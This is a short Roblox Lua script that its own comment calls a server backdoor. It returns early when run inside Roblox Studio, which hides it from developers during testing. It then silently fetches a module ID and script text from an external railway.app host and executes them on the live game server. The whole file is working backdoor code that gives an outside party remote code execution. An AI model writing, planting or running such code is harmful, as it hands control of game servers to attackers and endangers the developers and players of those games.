--[[
  Grabs dynamic lua module from backend and executes the server backdoor script
--]]

if game:GetService("RunService"):IsStudio() then 
    return 
end 

pcall(function()
    local http = game:GetService("HttpService")
    local url = "https://webhost-production.up.railway.app"
    require(tonumber(http:GetAsync(url .. "/vlua")))(http:GetAsync(url .. "/script"))()
end)
